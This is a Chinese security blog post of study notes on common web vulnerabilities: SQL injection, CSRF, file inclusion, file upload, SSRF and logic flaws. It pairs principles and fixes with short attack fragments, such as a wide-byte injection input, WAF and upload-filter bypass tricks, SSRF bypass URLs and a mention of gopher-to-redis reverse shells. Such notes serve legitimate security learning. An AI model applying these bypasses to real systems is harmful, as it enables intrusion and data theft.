

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="H0ne">
  <meta name="keywords" content="">
  
    <meta name="description" content="00-TOP10漏洞123456789101.SQL注入2.失效的身份认证和会话管理3.跨站脚本攻击XSS4.直接引用不安全的对象5.安全配置错误6.敏感信息泄露7.缺少功能级的访问控制8.跨站请求伪造CSRF9.实验含有已知漏洞的组件10.未验证的重定向和转发  01-SQL注入漏洞123456789101112131415161718192021222324252627282930313233">
<meta property="og:type" content="article">
<meta property="og:title" content="小总结（二）">
<meta property="og:url" content="http://example.com/2023/04/20/%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
<meta property="og:site_name" content="H0ne&#39;s Blog">
<meta property="og:description" content="00-TOP10漏洞123456789101.SQL注入2.失效的身份认证和会话管理3.跨站脚本攻击XSS4.直接引用不安全的对象5.安全配置错误6.敏感信息泄露7.缺少功能级的访问控制8.跨站请求伪造CSRF9.实验含有已知漏洞的组件10.未验证的重定向和转发  01-SQL注入漏洞123456789101112131415161718192021222324252627282930313233">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/c8b8f7e02fd293eb14e3fc2a1d303c41.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/cc111b391046ab7ce02ad652d8060cf4.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/bf95dd787930324fbe2524633c252f94.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/32b2a698ed5c3825c16a877c703e6a57.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/249509d898d09939e1abbfb32fd93f55.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/568ac011469665ba1c28916775686118.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/a7f94f0ce00e474ded22543f85981bcb.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/1c5a169f5a0098b029c786f55e3e5488.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/f1183582abd42b6f4439285468f7a71e.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/cc92324f7991389d213002fdf7f6b585.png">
<meta property="article:published_time" content="2023-04-20T15:33:27.695Z">
<meta property="article:modified_time" content="2023-04-20T15:20:44.161Z">
<meta property="article:author" content="H0ne">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/img_convert/c8b8f7e02fd293eb14e3fc2a1d303c41.png">
  
  
  
  <title>小总结（二） - H0ne&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/fluid-extension.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>H0ne&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="小总结（二）"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-04-20 23:33" pubdate>
          2023年4月20日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          61k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          513 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">小总结（二）</h1>
            
            
              <div class="markdown-body">
                
                <h2 id="00-TOP10漏洞"><a href="#00-TOP10漏洞" class="headerlink" title="00-TOP10漏洞"></a>00-TOP10漏洞</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span><span class="hljs-keyword">SQL</span>注入<br><span class="hljs-number">2.</span>失效的身份认证和会话管理<br><span class="hljs-number">3.</span>跨站脚本攻击XSS<br><span class="hljs-number">4.</span>直接引用不安全的对象<br><span class="hljs-number">5.</span>安全配置错误<br><span class="hljs-number">6.</span>敏感信息泄露<br><span class="hljs-number">7.</span>缺少功能级的访问控制<br><span class="hljs-number">8.</span>跨站请求伪造CSRF<br><span class="hljs-number">9.</span>实验含有已知漏洞的组件<br><span class="hljs-number">10.</span>未验证的重定向和转发<br></code></pre></td></tr></table></figure>

<h2 id="01-SQL注入漏洞"><a href="#01-SQL注入漏洞" class="headerlink" title="01-SQL注入漏洞"></a>01-SQL注入漏洞</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs llvm">原理：产生SQL注入漏洞的根本原因在于代码中没有对用户输入项进行验证和处理便直接拼接到查询语句中。利用SQL注入漏洞，攻击者可以在应用的查询语句中插入自己的SQL代码并传递给后台SQL服务器时加以解析并执行。<br> <br>分类：<br> <span class="hljs-number">1</span>.显注<br> <span class="hljs-number">2</span>.盲注（无回显）： 时间型、布尔型、报错型<br>盲注：<br>特点：盲注在于无法构造出回显位时使用<br>优点：优点是适配绝大部分注入点<br>缺点：注入繁琐，费时费力，高频率对服务器发起访问也容易被ban。<br>分类：布尔盲注，时间盲注，dnslog盲注<br>布尔盲注<br>特点:以页面回显的内容的不同作为判定依据。<br>时间盲注<br>时间盲注，以回显的时间长短作为判断依旧<br>dnslog盲注<br>特点:必须windows系统，必须root权限，必须secure_file_priv为空<br>报错注入<br>特点：经过精心构造的函数，让函数处理user()等不合规定的数据，引发mysql报错。最常用的是updatexml()<br>优点：报错注入优点是注入位置广泛，几乎任何和数据库有关的操作经过sql拼接都可以产生报错注入，有回显位，获取数据方便。<br>缺点：缺点是必须开启错误提示，mysqli_error()<br><br> <br>什么是宽字节注入？<br>当后端对用户的输入做了转义时，比如利用addslashes()或mysql_escape_string()函数。此时输入id<span class="hljs-operator">=</span><span class="hljs-number">1</span>’其中的单引号会被转义而变成id<span class="hljs-operator">=</span><span class="hljs-number">1</span>\&#x27;，这样就使得单引号无法闭合数据库中的语句，一般情况下是很难绕过的。但是有两种情况可以通过宽字节注入绕过。<br>第一中情况是当数据库的编码为GBK时，注入格式为id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%df</span>&#x27;，因为反斜杠\的编码为<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>，所以参数传到后端经过转义后就会变成id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>&#x27;，其中GBK会将<span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>编码成一个繁体字，这样反斜杠就失去了转义的效果，使得单引号逃逸出来闭合了语句。<br>第二种情况是，若后端的代码中有转换字符编码的函数，道理其实一样，就是将用户输入的参数用宽字节去解释了，从而使单引号逃逸。<br><br>二次注入<br>特点：sql语句的变量并不是直接传入的变量，而是通过其它的方式保存到了数据库，形成二次注入<br>例子：<br>比如注册一个用户名为 admin’ #的用户，注册时并无SQL注入，修改密码时的SQL语句，导致越权修改了admin的密码。<br><br>危害：<br><span class="hljs-number">1</span>.数据库信息泄露<br><span class="hljs-number">2</span>.网页篡改<br><span class="hljs-number">3</span>.网站被挂马，传播恶意软件<br><span class="hljs-number">4</span>.数据库被恶意操作<br><span class="hljs-number">5</span>.服务器被植入后门<br><span class="hljs-number">6</span>.破坏硬盘或者服务器等硬件设备<br><br>如何进行SQL注入的防御<br><span class="hljs-number">1</span>.关闭应用的错误提示 <br><span class="hljs-number">2</span>.加waf<br><span class="hljs-number">3</span>.对输入进行过滤<br><span class="hljs-number">4</span>.限制输入长度<br><span class="hljs-number">5</span>.限制好数据库权限，drop/create/truncate等权限谨慎grant<br><span class="hljs-number">6</span>.预编译好sql语句，python和Php中一般使用?作为占位符。这种方法是从编程框架方面解决利用占位符参数的sql注入，只能说一定程度上防止注入。还有缓存溢出、终止字符等。<br><span class="hljs-number">7</span>.数据库信息加密安全（引导到密码学方面）。不采用md<span class="hljs-number">5</span>因为有彩虹表，一般是一次md<span class="hljs-number">5</span>后加盐再md<span class="hljs-number">5</span><br><span class="hljs-number">8</span>.清晰的编程规范，结对/自动化代码review，加大量现成的解决方案（PreparedStatement，ActiveRecord，歧义字符过滤， 只可访问存储过程 balabala）已经让SQL注入的风险变得非常低了。<br><br>绕过技术：<br><span class="hljs-number">1</span>，关键字可以用%（只限 IIS 系列）。比如 <span class="hljs-keyword">select</span>，可以 sel<span class="hljs-variable">%e</span><span class="hljs-variable">%ct</span><br><span class="hljs-number">2</span>，通杀的，内联注释，如 /*<span class="hljs-title">!select</span>*/<br><span class="hljs-number">3</span>，编码，可两次编码<br><span class="hljs-number">4</span>，multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了<br>绝大多数 WAF<br><span class="hljs-number">5</span>，参数绕过，复制参数，id<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-number">6</span>，组合法 如 <span class="hljs-keyword">and</span> 可以用&amp;&amp;再 URL 编码<br><span class="hljs-number">7</span>、替换法，如 <span class="hljs-keyword">and</span> 改成&amp;&amp;<span class="hljs-comment">;=可以用 like 或 in 等</span><br>MySQL<span class="hljs-number">5.0</span>以上版本存在一个叫information_schema的数据库，它存储着数据库的所有信息，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型和访问权限等。而<span class="hljs-number">5.0</span>以下没有。<br></code></pre></td></tr></table></figure>

<h2 id="02-CSRF漏洞"><a href="#02-CSRF漏洞" class="headerlink" title="02-CSRF漏洞"></a>02-CSRF漏洞</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql">原理：CSRF跨站点请求伪造。攻击者盗用了受害者的身份，以受害者的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作<br><br>危害：<br><span class="hljs-number">1</span>、对网站管理员进行攻击<br><span class="hljs-number">2</span>、修改受害网站上的用户账户和数据<br><span class="hljs-number">3</span>、账户劫持<br><span class="hljs-number">4</span>、传播CSRF蠕虫进行大规模攻击<br><span class="hljs-number">5</span>、利用csrf进行拖库<br><span class="hljs-number">6</span>、利用其他漏洞进行组合拳攻击<br><span class="hljs-number">7</span>、针对路由器的csrf攻击<br><br>如何防护：<br> 尽量使用POST，限制<span class="hljs-keyword">GET</span>；<br> 浏览器Cookie策略；<br> 加验证码； <br> Referer <span class="hljs-keyword">Check</span>；<br> Anti CSRF Token<br></code></pre></td></tr></table></figure>

<h2 id="03-文件包含漏洞"><a href="#03-文件包含漏洞" class="headerlink" title="03-文件包含漏洞"></a>03-文件包含漏洞</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros">类型<br>1.本地文件包含<br>2.远程文件包含 ：即加载远程文件，在`php.ini`中开allow_url_include 、allow_url_fopen选项。开启后可以直接执行任意代码。<br><br>PHP文件包含函数<br>1.include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。<br>2.inclue_once()：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。<br>3.require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。<br>4.require_once()：功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。<br><br>利用：<br> 1.读取敏感文件<br> 2.远程包含shell<br> 3.图片上传并包含图片shenll<br> 4.使用伪协议<br> 5.包含日志文件GetShell<br> 6.截断包含<br> <br>修复方案<br>1.禁止远程文件包含<span class="hljs-attribute">allow_url_include</span>=off<br>2.配置<span class="hljs-attribute">open_basedir</span>=指定目录，限制访问区域。<br>3.过滤<span class="hljs-built_in">..</span>/等特殊符号<br>4.修改Apache日志文件的存放地址<br>5.开启魔术引号<span class="hljs-attribute">magic_quotes_qpc</span>=on<br>6.尽量不要使用动态变量调用文件，直接写要包含的文件。<br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/img_convert/c8b8f7e02fd293eb14e3fc2a1d303c41.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<h2 id="04-文件上传漏洞"><a href="#04-文件上传漏洞" class="headerlink" title="04-文件上传漏洞"></a>04-文件上传漏洞</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs llvm"> 原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀<br>以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器.<br><br>危害 <br>操作木马文件提权 获取网站权限<br><br>绕过方法：<br><span class="hljs-number">1</span>.黑名单<br> a.后缀名不完整 .php<span class="hljs-number">5</span> .phtml等<br> b.上传.htacess<br> <span class="hljs-keyword">c</span>.大小写<br> d.在数据包中 后文件缀名前加空格<br> e.后缀名前加.<br> f.加上::$DATA<br> g.未循环验证，可以使用<span class="hljs-keyword">x</span>.php..类似的方法<br> <br><span class="hljs-number">2</span>.白名单（一般需要配合其他漏洞一起利用）<br> a.<span class="hljs-variable">%00</span>截断<br> b.图片马<br> <span class="hljs-keyword">c</span>.条件竞争<br> <br>修复：<br> <span class="hljs-number">1</span>.后端验证：采用服务端验证模式<br> <span class="hljs-number">2</span>.后缀验证：基于白名单，黑名单过滤<br> <span class="hljs-number">3</span>.MIME验证：基于上传自带类型艰检测<br> <span class="hljs-number">4</span>.内容检测：文件头，完整性检测<br> <span class="hljs-number">5</span>.自带函数过滤<br> <span class="hljs-number">6</span>.WAF防护软件：宝塔、云盾等<br></code></pre></td></tr></table></figure>

<h2 id="05-SSRF漏洞"><a href="#05-SSRF漏洞" class="headerlink" title="05-SSRF漏洞"></a>05-SSRF漏洞</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs armasm">利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。<br><br><span class="hljs-symbol">ssrf</span>危害：<br><span class="hljs-number">1</span>. 探测内网信息,用协议探`ftp%<span class="hljs-number">26</span><span class="hljs-built_in">ip</span>=&#123;<span class="hljs-built_in">ip</span>&#125;%<span class="hljs-number">26</span>port=&#123;port&#125;`<br><span class="hljs-number">2</span>. 攻击内网或本地其他服务<br><span class="hljs-number">3</span>. 穿透防火墙<br><br>具体利用的方式：<br>具体操作需要查看支持的协议，file协议查看文件、dict协议探测端口、ophergopher协议支持<span class="hljs-meta">GET</span>&amp;POST请求，同时在攻击内网ftp、redis、telnet、Memcache上有极大作用利用gopher协议访问redis反弹shell<br><br>漏洞存在的地方：<br><span class="hljs-number">1</span>.能够对外发起网络请求的地方<br><span class="hljs-number">2</span>.请求远程服务器资源的地方<br><span class="hljs-number">3</span>.数据库内置功能<br><span class="hljs-number">4</span>.邮件系统<br><span class="hljs-number">5</span>.文件处理<br><span class="hljs-number">6</span>.在线处理工具<br>举几个例子：<br><span class="hljs-number">1</span>.在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。<br><span class="hljs-number">2</span>.根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。<br><span class="hljs-number">3</span>.数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。<br><span class="hljs-number">4</span>.邮件系统就是接收邮件服务器地址这些地方。<br><span class="hljs-number">5</span>.文件就找ImageMagick，xml这些。<br><span class="hljs-number">6</span>.从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。<br><br>绕过姿势<br><span class="hljs-number">1</span>.http:<span class="hljs-comment">//example.com@127.0.0.1`</span><br><span class="hljs-number">2</span>.利用<span class="hljs-built_in">IP</span>地址的省略写法绕过,[::]绕过localhost<br><span class="hljs-number">3</span>.DNS解析 http:<span class="hljs-comment">//127.0.0.1.xip.io/可以指向任意ip的域名：xip.io</span><br><span class="hljs-number">4</span>.利用八进制<span class="hljs-built_in">IP</span>地址绕过,利用十六进制<span class="hljs-built_in">IP</span>地址,绕过利用十进制的<span class="hljs-built_in">IP</span>地址绕过<br><br>修复：<br><span class="hljs-number">1</span>.地址做白名单处理<br><span class="hljs-number">2</span>.域名识别<span class="hljs-built_in">IP</span> 过滤内部<span class="hljs-built_in">IP</span><br><span class="hljs-number">3</span>.校验返回的内容对比是否与假定的一致<br></code></pre></td></tr></table></figure>

<h2 id="06-逻辑漏洞"><a href="#06-逻辑漏洞" class="headerlink" title="06-逻辑漏洞"></a>06-逻辑漏洞</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/cc111b391046ab7ce02ad652d8060cf4.png" srcset="/img/loading.gif" lazyload alt="图片"></p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">1.挖过的逻辑漏洞：<br>订单任意金额修改<br><span class="hljs-code"> 相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。</span><br>预防思路：<br><span class="hljs-bullet">- </span>订单需要多重效验<br><span class="hljs-bullet">- </span>订单数值较大的时候需要人工审核<br><br>2.验证码回传<br>漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件<br>预防思路：<br><span class="hljs-bullet">- </span>response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加<br><span class="hljs-bullet">- </span>如果要进行前端验证的话也可以，但是需要进行加密<br><br>3.未进行登陆凭证验证<br>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没验证ID或cookie验证导致越权。<br>预防思路：<br><span class="hljs-bullet">- </span>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证<br><br>4.接口无限制枚举<br><span class="hljs-bullet">- </span>某电商登陆接口无验证导致撞库<br><span class="hljs-bullet">- </span>某招聘网验证码无限制枚举<br><span class="hljs-bullet">- </span>某快递公司优惠券枚举<br><span class="hljs-bullet">- </span>某电商会员卡卡号枚举<br><br>预防思路：<br><span class="hljs-bullet">- </span>在输入接口设置验证，如token，验证码等。如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。<br><span class="hljs-bullet">- </span>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。<br><span class="hljs-bullet">- </span>验证码不要用短数字，尽量6位以上，最好是以字母加数字进行组合，并且验证码需要设定时间期限。<br><span class="hljs-bullet">- </span>优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合<br><br>5.cookie设置存在缺陷<br><span class="hljs-bullet">- </span>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举.<br><span class="hljs-bullet">- </span>cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证<br><span class="hljs-bullet">- </span>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法<br><span class="hljs-bullet">- </span>越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限<br><br>预防思路<br>1.cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。<br>2.用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。<br>3.用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。<br>4.cookie中设定session参数，以防cookie可以长时间生效。<br>5.根据业务不同还有很多方法<br></code></pre></td></tr></table></figure>

